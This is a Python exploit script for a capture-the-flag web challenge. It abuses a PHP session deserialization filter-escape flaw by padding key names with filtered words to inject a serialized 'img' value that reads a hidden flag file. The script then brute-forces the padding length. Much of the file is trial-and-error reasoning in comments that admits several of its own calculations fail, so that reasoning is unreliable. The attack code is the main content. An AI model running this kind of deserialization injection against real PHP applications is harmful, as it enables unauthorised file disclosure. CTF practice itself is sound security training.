import requests
import base64
import time

url = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/index.php"

# Target file: fl1g.php (note: it's digit 1, not letter l)
target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()  # ZmwxZy5waHA=

print(f"Target file: {target}")
print(f"Base64 encoded: {target_b64}")

# Injection payload to add a new img key
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
print(f"Injection: {inject}")
print(f"Injection length: {len(inject)}")

# Key name escape: use filter keywords in the KEY NAME
# Each "flag" (4 bytes) -> '' (0 bytes), shrinking by 4
# Each "php" (3 bytes) -> '' (0 bytes), shrinking by 3

# We need the key name to shrink by len(inject) bytes
# Let's use "flag" * N where N = len(inject) // 4

# But wait, the hint says the key name should contain enough keywords
# to "eat" the separator and inject a new img

# Let me think about this:
# We POST: _SESSION[flagflag...]=inject
# 
# Serialized: a:...:{s:N:"flagflag...";s:len(inject):"inject";...}
# 
# After filter: a:...:{s:N:"";s:len(inject):"inject";...}
# 
# The key name is now empty, but the length says N bytes.
# PHP reads N bytes from "" (empty), which means it reads from the next position.
# 
# The next position is: ";s:len(inject):"inject";...
# 
# PHP reads N bytes: ";s:len(inject):"inject";... (N bytes from the separator)
# 
# This becomes the KEY NAME!
# 
# Then PHP expects the KEY VALUE.
# 
# The next chars are: ... (remaining content)
# 
# If we craft it correctly, PHP will parse our injection as the KEY VALUE!

# Let me calculate:
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (28 bytes)
# 
# We want the key name to shrink by enough bytes to "eat" the separator ";s:len(inject):"
# 
# The separator is: ";s:28:" (6 bytes)
# 
# If the key name shrinks by 6 bytes, PHP reads 6 bytes from the separator.
# PHP reads: ";s:28 (6 bytes)
# This becomes the KEY NAME.
# 
# Then PHP expects the KEY VALUE.
# The next chars are: "inject";...
# PHP parses this as the VALUE.
# 
# But the VALUE is: "inject"; which is: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# Hmm, this doesn't work because the VALUE starts with ", not a serialized string!

# Let me think about this differently.
# 
# The hint says: "键名长度 7 但实际为空，反序列化时向后多读 7 个字符"
# 
# So the key name shrinks, and PHP reads extra bytes from the next position.
# 
# The key insight: the extra bytes become part of the KEY NAME,
# and the remaining content becomes the KEY VALUE!

# Let me trace through:
# 
# Serialized: s:7:"flagphp";s:N:"inject"
# After filter: s:7:"";s:N:"inject"
# 
# PHP reads 7 bytes from "" (empty).
# PHP reads: ";s:N:" (7 bytes from the separator)
# 
# Wait, let me count: ";s:N:"
# " = 1
# ; = 1
# s = 1
# : = 1
# N = 1 (or more digits)
# : = 1
# 
# That's 6 bytes if N is 1 digit, or more if N is multiple digits.

# Let me try a specific example:
# 
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (28 bytes)
# 
# Serialized: s:7:"flagphp";s:28:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# After filter: s:7:"";s:28:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 7 bytes from "" (empty).
# Content after "" is: ";s:28:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 7 bytes: ";s:28:" (7 bytes)
# 
# Wait, let me count: ";s:28:"
# " = 1
# ; = 1
# s = 1
# : = 1
# 2 = 1
# 8 = 1
# : = 1
# 
# That's 7 bytes!
# 
# KEY NAME = ";s:28:"
# 
# Then PHP expects the KEY VALUE.
# The next chars are: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP parses: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# But this starts with ", not a serialized value!

# Hmm, this doesn't work either!

# Let me re-read the hint more carefully.
# 
# "键名长度 7 但实际为空，反序列化时向后多读 7 个字符"
# 
# So the key name shrinks by 7 bytes (flagphp -> '', 7 bytes -> 0 bytes).
# 
# PHP reads 7 bytes from the empty key name.
# 
# The 7 bytes come from the separator: ";s:28:"
# 
# KEY NAME = ";s:28:"
# 
# Then PHP expects the KEY VALUE.
# 
# The next chars are: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# But this starts with ", which is the opening quote of the VALUE!
# 
# PHP reads: " (opening quote)
# Then PHP reads the VALUE content: ;s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# Wait, that's not right. The VALUE should be a serialized string: s:N:"content"

# I think I'm still misunderstanding.

# Let me try a different approach: just test the exploit!

# The key name should be: flagflagflagflag (16 bytes, 4 'flag's)
# After filter: '' (0 bytes)
# 
# The injection should be: ";s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# Let me test:

session = requests.Session()

# Key name with filter keywords
key_name = "flagflagflagflag"  # 16 bytes, 4 'flag's
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'  # 28 bytes

print(f"\nKey name: {key_name}")
print(f"Key name length: {len(key_name)}")

# POST data
data = {
    '_SESSION[' + key_name + ']': inject
}

print(f"\nPOST data: {data}")

# Send request
r = session.post(url + "?f=show_image", data=data)
print(f"\nResponse: {r.text[:500]}")

time.sleep(0.5)

# Try different key name lengths
for num_flags in range(1, 10):
    key_name = "flag" * num_flags
    inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
    
    data = {
        '_SESSION[' + key_name + ']': inject
    }
    
    r = session.post(url + "?f=show_image", data=data)
    
    if "flag" in r.text.lower() or r.text.strip() != "":
        print(f"\n=== num_flags={num_flags} ===")
        print(f"Response: {r.text}")
        if "flag{" in r.text or "FLAG{" in r.text:
            print("FOUND FLAG!")
            break
    
    time.sleep(0.5)

